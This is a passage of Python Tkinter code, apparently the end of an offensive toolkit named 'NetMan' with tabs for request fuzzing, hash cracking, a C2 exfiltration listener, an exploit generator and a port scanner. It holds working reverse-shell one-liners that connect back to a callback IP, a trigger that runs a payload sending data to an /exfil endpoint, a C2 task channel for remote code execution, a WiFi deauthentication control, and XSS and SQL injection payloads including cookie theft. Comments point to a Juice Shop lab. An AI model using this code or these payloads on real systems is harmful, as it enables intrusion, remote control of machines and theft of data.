intruder_results.heading('Location', text='Redirect Location', command=lambda: sort_column(intruder_results, 'Location', False))
intruder_results.heading('Match', text='Match Found', command=lambda: sort_column(intruder_results, 'Match', False))
intruder_results.heading('Skimmer Hits', text='Skimmer Hits', command=lambda: sort_column(intruder_results, 'Skimmer Hits', False))

intruder_results.column('Payload', width=150)
intruder_results.column('Status', width=80, anchor=tk.CENTER)
intruder_results.column('Length', width=100, anchor=tk.CENTER)
intruder_results.column('Time', width=80, anchor=tk.CENTER)
intruder_results.column('Location', width=120, anchor=tk.CENTER)
intruder_results.column('Match', width=80, anchor=tk.CENTER)
intruder_results.column('Skimmer Hits', width=200, anchor=tk.W)

intruder_results.pack(fill=tk.BOTH, expand=True)

intruder_results.tag_configure('skimmer_hit', foreground='red')
intruder_results.pack(fill=tk.BOTH, expand=True)

intruder_search_frame = tk.Frame(response_tab)
intruder_search_frame.pack(pady=5)

tk.Label(intruder_search_frame, text="Find:").pack(side=tk.LEFT)
intruder_search_entry = tk.Entry(intruder_search_frame, width=30)
intruder_search_entry.pack(side=tk.LEFT, padx=5)

intruder_search_entry.bind("<Return>", lambda e: search_intruder_response())

intruder_search_btn = tk.Button(intruder_search_frame, text="Match", command=search_intruder_response)
intruder_search_btn.pack(side=tk.LEFT)

intruder_response_frame = tk.Frame(response_tab)
intruder_response_frame.pack(fill=tk.BOTH, expand=True)

intruder_response_scroll = tk.Scrollbar(intruder_response_frame)
intruder_response_scroll.pack(side=tk.RIGHT, fill=tk.Y)

intruder_response_text = tk.Text(intruder_response_frame, height=15, width=88, yscrollcommand=intruder_response_scroll.set)
intruder_response_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

intruder_response_scroll.config(command=intruder_response_text.yview)

intruder_results.bind("<<TreeviewSelect>>", view_intruder_response)

cracker_frame = tk.Frame(cracker_tab)
cracker_frame.pack(pady=20)

tk.Label(cracker_frame, text="Target Hash:", font=("Arial", 10)).grid(row=0, column=0, sticky="e", pady=5)
cracker_hash_entry = tk.Entry(cracker_frame, width=40)
cracker_hash_entry.grid(row=0, column=1, padx=5, pady=5)

tk.Label(cracker_frame, text="Auto-detects MD5 / SHA-1 / SHA-256", font=("Arial", 9), fg="gray").grid(row=0, column=2, sticky="w", padx=5)

tk.Label(cracker_frame, text="Wordlist:", font=("Arial", 10)).grid(row=1, column=0, sticky="e", pady=5)
cracker_wordlist_entry = tk.Entry(cracker_frame, width=40)
cracker_wordlist_entry.grid(row=1, column=1, padx=5, pady=5)

if os.path.exists('/usr/share/wordlists/rockyou.txt'):
    cracker_wordlist_entry.insert(0, "rockyou.txt")

cracker_browse_btn = tk.Button(cracker_frame, text="Browse...", command=browse_cracker_wordlist)
cracker_browse_btn.grid(row=1, column=2, padx=5)

cracker_attack_btn = tk.Button(cracker_frame, text="Start Attack", bg="darkred", fg="white", font=("Arial", 10, "bold"), command=start_cracker_attack)
cracker_attack_btn.grid(row=2, column=1, pady=15)

cracker_result_label = tk.Label(cracker_frame, text="Ready", font=("Arial", 12, "bold"))
cracker_result_label.grid(row=3, column=0, columnspan=3, pady=10)

exfil_status_label = tk.Label(exfil_tab, text="Listener Status: Active", font=("Arial", 12, "bold"), fg="green")
exfil_status_label.pack(pady=(20, 0))

c2_frame = tk.LabelFrame(exfil_tab, text="C2", font=("Arial", 10, "bold"), fg="cyan", bg="#2b2b2b")
c2_frame.pack(pady=5, padx=20, fill="x")

ip_label = tk.Label(c2_frame, text="Callback IP:", bg="#2b2b2b", fg="white")
ip_label.pack(side=tk.LEFT, padx=5)

ip_entry = tk.Entry(c2_frame, width=15, bg="black", fg="cyan", insertbackground="white")
ip_entry.insert(0, "172.17.0.1")
ip_entry.pack(side=tk.LEFT, padx=5)

path_label = tk.Label(c2_frame, text="Payload Path:", bg="#2b2b2b", fg="white")
path_label.pack(side=tk.LEFT, padx=5)

path_entry = tk.Entry(c2_frame, width=20, bg="black", fg="yellow", insertbackground="white")
path_entry.insert(0, "/tmp/netman.js")
path_entry.pack(side=tk.LEFT, padx=5)

def on_task_select(event):
    selection = task_dropdown.get()
    code_snippet = QUICK_TASKS.get(selection, "")
    
    # Detect language based on OS fingerprint caught by Proxy
    is_python = ("Windows" in current_target_os or "Linux" in current_target_os)

    if selection == "Env: List Keys":
        # Python vs JS logic for environment keys
        code_snippet = "print(list(os.environ.keys()))" if is_python else "Object.keys(process.env).join(', ')"
        
    elif selection == "FS: Read File":
        # Generates a template for you to finish in the text box
        code_snippet = "print(open('PATH_HERE').read())" if is_python else "require('fs').readFileSync('PATH_HERE', 'utf8')"

    elif selection == "Python: Reverse Shell":
        # Your auto-detect logic from before
        cb_ip = ip_entry.get()
        if "Windows" in current_target_os:
            code_snippet = f"import socket,subprocess;s=socket.socket();s.connect(('{cb_ip}',4444));subprocess.Popen(['cmd.exe'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"
        else:
            code_snippet = f"import socket,os,subprocess;s=socket.socket();s.connect(('{cb_ip}',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

    if code_snippet:
        # Wrap the result in the JSON 'envelope' for the payloads
        json_payload = f'{{"code": "{code_snippet}"}}'
        c2_input.delete(0, tk.END)
        c2_input.insert(0, json_payload)

task_dropdown = ttk.Combobox(c2_frame, values=list(QUICK_TASKS.keys()), state="readonly", width=18)
task_dropdown.current(0)
task_dropdown.pack(side=tk.LEFT, padx=5)

task_dropdown.bind("<<ComboboxSelected>>", on_task_select)

c2_instr = tk.Label(c2_frame, text="Enter JSON Task (e.g. {'code': '2+2'}):", bg="#2b2b2b", fg="white")
c2_instr.pack(side=tk.LEFT, padx=10, pady=10)

c2_input = tk.Entry(c2_frame, width=40, bg="black", fg="limegreen", insertbackground="white")
c2_input.insert(0, '{"code": "2 + 2"}')
c2_input.pack(side=tk.LEFT, padx=5, pady=5, expand=True, fill="x")

def set_task():
    task_data = c2_input.get()
    try:
        with open("task.json", "w") as f:
            f.write(task_data)
        exfil_text.insert(tk.END, f"[+] C2 Task Updated: {task_data}\n")
        exfil_text.see(tk.END)
    except Exception as e:
        exfil_text.insert(tk.END, f"[!] Error saving task: {e}\n")

target_type_var = tk.StringVar(value="JS/Docker") # Default to your current setup

def trigger_payload():
    target_ip = ip_entry.get()
    target_path = path_entry.get()
    if target_type_var.get() == "JS/Docker":
        # Your original JS trigger for Juice Shop
        container_id = "65edd3bb2afc"
        
    if target_type_var.get() == "JS/Docker":
        cmd = f"docker exec -d {container_id} /nodejs/bin/node {target_path} http://{target_ip}:8080/exfil"
    else:
        cmd = f"python3 {target_path}" 
        
    try:
        subprocess.Popen(cmd, shell=True)
        exfil_text.insert(tk.END, f"[*] Trigger Sent ({target_type_var.get()}) to {target_ip}!\n")
    except Exception as e:
        exfil_text.insert(tk.END, f"[!] Trigger Failed: {e}\n")

def clear_task():
    idle_cmd = '{"code": "undefined"}' 
    try:
        with open("task.json", "w") as f:
            f.write(idle_cmd)
        c2_input.delete(0, tk.END)
        c2_input.insert(0, idle_cmd)
        exfil_text.insert(tk.END, "[*] C2 Task Cleared (Idle Mode)\n")
    except Exception as e:
        exfil_text.insert(tk.END, f"[!] Error clearing task: {e}\n")
        
def generate_payload():
    target_ip = ip_entry.get()
    try:
        with open("payload.py", "r") as f:
            content = f.read()
        
        new_content = content.replace("REPLACE_ME", target_ip)
        
        with open("payload_ready.py", "w") as f:
            f.write(new_content)
            
        exfil_text.insert(tk.END, f"[+] Payload generated for {target_ip}: payload_ready.py\n")
        exfil_text.see(tk.END)
    except Exception as e:
        exfil_text.insert(tk.END, f"[!] Generation failed: {e}\n")

gen_btn = tk.Button(c2_frame, text="GENERATE", command=generate_payload, 
                    bg="purple", fg="white", font=("Arial", 9, "bold"), width=10)
gen_btn.pack(side=tk.LEFT, padx=2)

# Radiobuttons to toggle between JS/Docker and Python/VM
type_frame = tk.Frame(c2_frame, bg="#2b2b2b")
type_frame.pack(side=tk.LEFT, padx=10)

tk.Radiobutton(type_frame, text="JS/Docker", variable=target_type_var, value="JS/Docker", 
               bg="#2b2b2b", fg="white", selectcolor="black").pack(side=tk.LEFT)
tk.Radiobutton(type_frame, text="Python/VM", variable=target_type_var, value="Python/VM", 
               bg="#2b2b2b", fg="white", selectcolor="black").pack(side=tk.LEFT)

start_btn = tk.Button(c2_frame, text="START", command=trigger_payload,
                     bg="#b22222", fg="white", font=("Arial", 9, "bold"), width=8)
start_btn.pack(side=tk.LEFT, padx=2)

task_btn = tk.Button(c2_frame, text="TASK", command=set_task, 
                     bg="#444", fg="white", font=("Arial", 9, "bold"), width=8)
task_btn.pack(side=tk.LEFT, padx=2)

clear_btn = tk.Button(c2_frame, text="CLEAR", command=clear_task, 
                      bg="#555", fg="white", font=("Arial", 9, "bold"), width=8)
clear_btn.pack(side=tk.LEFT, padx=2)

wicrack_bridge_frame = tk.LabelFrame(exfil_tab, text="WiCrack Bridge", font=("Arial", 10, "bold"))
wicrack_bridge_frame.pack(pady=5, padx=20, fill="x")

tk.Label(wicrack_bridge_frame, text="Status:", font=("Arial", 9, "bold")).pack(side=tk.LEFT, padx=(5, 2))
bridge_status_value = tk.Label(wicrack_bridge_frame, text="Offline", font=("Arial", 9, "bold"), fg="#c62828")
bridge_status_value.pack(side=tk.LEFT, padx=(0, 8))

tk.Label(wicrack_bridge_frame, text="Client MAC:", font=("Arial", 9)).pack(side=tk.LEFT, padx=5)
wicrack_client_entry = tk.Entry(wicrack_bridge_frame, width=20)
wicrack_client_entry.pack(side=tk.LEFT, padx=5)

tk.Label(wicrack_bridge_frame, text="AP BSSID:", font=("Arial", 9)).pack(side=tk.LEFT, padx=5)
wicrack_bssid_entry = tk.Entry(wicrack_bridge_frame, width=20)
wicrack_bssid_entry.pack(side=tk.LEFT, padx=5)

wicrack_send_btn = tk.Button(
    wicrack_bridge_frame,
    text="Send Deauth to WiCrack",
    bg="#1f6f8b",
    fg="white",
    font=("Arial", 9, "bold"),
    command=send_deauth_to_wicrack,
)
wicrack_send_btn.pack(side=tk.LEFT, padx=10)

bridge_reconnect_btn = tk.Button(
    wicrack_bridge_frame,
    text="Reconnect",
    bg="#3d5a80",
    fg="white",
    font=("Arial", 9, "bold"),
    command=reconnect_app_bridge,
)
bridge_reconnect_btn.pack(side=tk.LEFT, padx=5)

launch_wicrack_btn = tk.Button(
    wicrack_bridge_frame,
    text="Launch WiCrack (sudo)",
    bg="#2d6a4f",
    fg="white",
    font=("Arial", 9, "bold"),
    command=launch_wicrack_from_netman,
)
launch_wicrack_btn.pack(side=tk.LEFT, padx=5)

exfil_text_frame = tk.Frame(exfil_tab)
exfil_text_frame.pack(fill='both', expand=True, padx=10, pady=10)

exfil_scroll = tk.Scrollbar(exfil_text_frame)
exfil_scroll.pack(side=tk.RIGHT, fill=tk.Y)

exfil_text = tk.Text(exfil_text_frame, height=18, bg="black", fg="limegreen", font=("Consolas", 11), yscrollcommand=exfil_scroll.set)
exfil_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

exfil_scroll.config(command=exfil_text.yview)

exfil_text.insert(tk.END, "[*] NetMan Exfil Listener Active...\n[*] Waiting for netman.local payloads...\n\n")

exploit_label = tk.Label(exploit_tab, text="Universal Exploit Generator", font=("Arial", 12, "bold"))
exploit_label.pack(pady=10)

exploit_url_frame = tk.Frame(exploit_tab)
exploit_url_frame.pack(pady=5)

common_payloads = {
    "Basic XSS": "<script>alert(1)</script>",
    "Image Error XSS": "<img src=x onerror=alert(document.cookie)>",
    "NetMan Custom Tag (Focus)": "<netman id=x tabindex=1 onfocus=alert(document.cookie)>#x",
    "SQLi: Auth Bypass": "' OR 1=1--",
    "SQLi: Union Column Discovery": "' UNION SELECT NULL,NULL,NULL--",
    "SQLi: Version Grab (MySQL)": "' UNION SELECT @@version,NULL--",
    "SQLi: Sleep (Time-Based)": "'; WAITFOR DELAY '0:0:5'--",
    "SQLi: Version Grab (PostgreSQL)": "' UNION SELECT version(), NULL--",
    "SQLi: Version Grab (Oracle - Banner)": "' UNION SELECT banner, NULL FROM v$version--",
    "SQLi: Version Grab (Oracle - Instance)": "' UNION SELECT version, NULL FROM v$instance--",
    "SQLi: Union Column Discovery (Oracle)": "' UNION SELECT NULL,NULL FROM dual--"
    }

tk.Label(exploit_url_frame, text="Target URL:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)
exploit_url_entry = tk.Entry(exploit_url_frame, width=60)
exploit_url_entry.pack(side=tk.LEFT, padx=5)
exploit_url_entry.bind("<Button-3>", show_right_click_menu)

exploit_payload_frame = tk.Frame(exploit_tab)
exploit_payload_frame.pack(pady=5)

tk.Label(exploit_payload_frame, text="Payload:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)
exploit_payload_entry = tk.Entry(exploit_payload_frame, width=60)
exploit_payload_entry.pack(side=tk.LEFT, padx=5)
exploit_payload_entry.bind("<Button-3>", show_right_click_menu)

payload_dropdown_frame =tk.Frame(exploit_tab)
payload_dropdown_frame.pack(pady=5)

transform_frame = tk.Frame(exploit_tab)
transform_frame.pack(pady=5)

tk.Label(transform_frame, text="Encoding:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)
transform_var = tk.StringVar(value="None")
transform_menu = ttk.Combobox(transform_frame, textvariable=transform_var, values=["None", "Base64", "MD5 Hash", "URL Encode"], state="readonly")
transform_menu.pack(side=tk.LEFT, padx=5)

exploit_gen_btn = tk.Button(exploit_tab, text="Generate Iframe", bg="darkgreen", fg="white", font=("Arial", 10, "bold"), command=generate_iframe)
exploit_gen_btn.pack(pady=10)

exploit_copy_btn = tk.Button(exploit_tab, text="Copy to Clipboard", bg="darkblue", fg="white", font=("Arial", 10, "bold"), command=copy_exploit_to_clipboard)
exploit_copy_btn.pack(pady=5)

tk.Label(payload_dropdown_frame, text="Quick Select", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)

payload_dropdown = ttk.Combobox(payload_dropdown_frame, values=list(common_payloads.keys()), state="readonly", width=57)
payload_dropdown.pack(side=tk.LEFT, padx=5)

payload_dropdown.bind("<<ComboboxSelected>>", load_selected_payload)

comment_frame = tk.Frame(exploit_tab)
comment_frame.pack(pady=5)

tk.Label(comment_frame, text="SQL Comment Style:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)
comment_style_var = tk.StringVar(value="--")
tk.Radiobutton(comment_frame, text="-- (Standard)", variable=comment_style_var, value="--").pack(side=tk.LEFT)
tk.Radiobutton(comment_frame, text="# (MySQL/Bypass)", variable=comment_style_var, value="#").pack(side=tk.LEFT)

exploit_gen_btn = tk.Button(exploit_tab, text="Generate Iframe", bg="darkgreen", fg="white", font=("Arial", 10, "bold"), command=generate_iframe)
exploit_gen_btn.pack(pady=10)

tk.Label(exploit_tab, text="Generated Exploit Code:", font=("Arial", 10)).pack(pady=5)
exploit_output = tk.Text(exploit_tab, height=8)
exploit_output.pack(fill='both', expand=True, padx=10, pady=5)

scanner_label = tk.Label(scanner_tab, text="Network Port Scanner", font=("Arial", 12, "bold"))
scanner_label.pack(pady=10)

scanner_target_frame = tk.Frame(scanner_tab)
scanner_target_frame.pack(pady=5)

tk.Label(scanner_target_frame, text="Target IP / URL:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)

scanner_target_entry = tk.Entry(scanner_target_frame, width=40)
scanner_target_entry.pack(side=tk.LEFT, padx=5)

scanner_target_entry.bind("<Button-3>", show_right_click_menu)

scanner_ports_frame = tk.Frame(scanner_tab)
scanner_ports_frame.pack(pady=5)

tk.Label(scanner_ports_frame, text="Ports:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)

scanner_ports_entry = tk.Entry(scanner_ports_frame, width=40)
scanner_ports_entry.pack(side=tk.LEFT, padx=5)

scanner_ports_entry.insert(0, "21, 22, 80, 443, 8080, 8082")

scanner_ports_entry.bind("<Button-3>", show_right_click_menu)

scanner_timeout_frame = tk.Frame(scanner_tab)
scanner_timeout_frame.pack(pady=5)

tk.Label(scanner_timeout_frame, text="Timeout (Seconds):", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)

scanner_timeout_entry = tk.Entry(scanner_timeout_frame, width=40)
scanner_timeout_entry.pack(side=tk.LEFT, padx=5)

scanner_timeout_entry.insert(0, "1.0")

scanner_timeout_entry.bind("<Button-3>", show_right_click_menu)

scanner_btn = tk.Button(scanner_tab, text="Start Scan", bg="darkred", fg="white", font=("Arial", 10, "bold"), command=start_port_scan)
scanner_btn.pack(pady=10)

tk.Label(scanner_tab, text="Scan Results:", font=("Arial", 10)).pack(pady=5)

scanner_output = tk.Text(scanner_tab, height=12)
scanner_output.pack(fill='both', expand=True, padx=10, pady=5)

def check_exfil_queue():
    try:
        while True:
            data = mitm_proxy.exfil_queue.get_nowait()
            exfil_text.insert(tk.END, f"[$$$] NEW HIT: {data}\n")
            global current_target_os
            if "OS: Windows" in data:
                current_target_os = "Windows"
                exfil_text.insert(tk.END, "[*] OS Detected: Windows\n")
            elif "OS: Linux" in data:
                current_target_os = "Linux"
                exfil_text.insert(tk.END, "[*] OS Detected: Linux\n")
            exfil_text.see(tk.END)
            exfil_status_label.config(text="Listener Status: Payload Caught!", fg="red")
            app.after(3000, lambda: exfil_status_label.config(text="Listener Status: Active", fg="green"))
    except queue.Empty:
        pass
    app.after(1000, check_exfil_queue)

check_exfil_queue()

repeater_text.bind("<Control-u>", quick_url_encode)
intruder_text.bind("<Control-u>", quick_url_encode)

repeater_text.bind("<Control-Shift-U>", quick_url_decode)
intruder_text.bind("<Control-Shift-U>", quick_url_decode)

repeater_text.bind("<Control-b>", quick_b64_encode)
repeater_text.bind("<Control-Shift-B>", quick_b64_decode)
repeater_text.bind("<Control-h>", quick_html_encode)
repeater_text.bind("<Control-Shift-H>", quick_html_decode)

intruder_text.bind("<Control-b>", quick_b64_encode)
intruder_text.bind("<Control-Shift-B>", quick_b64_decode)
intruder_text.bind("<Control-h>", quick_html_encode)
intruder_text.bind("<Control-Shift-H>", quick_html_decode)

if __name__ == "__main__":
    app.protocol("WM_DELETE_WINDOW", on_app_close)
    bridge_ok = init_app_bridge()
    check_bridge_queue()
    bridge_watchdog()
    if bridge_ok:
        exfil_text.insert(tk.END, "[BRIDGE] Local bridge online. Waiting for WiCrack...\n")
    else:
        exfil_text.insert(tk.END, "[BRIDGE] Bridge unavailable. NetMan running standalone.\n")
    exfil_text.see(tk.END)
    load_initial_history()
    check_for_new_traffic()
    check_intercept_queue()
    check_intruder_queue()
    app.mainloop()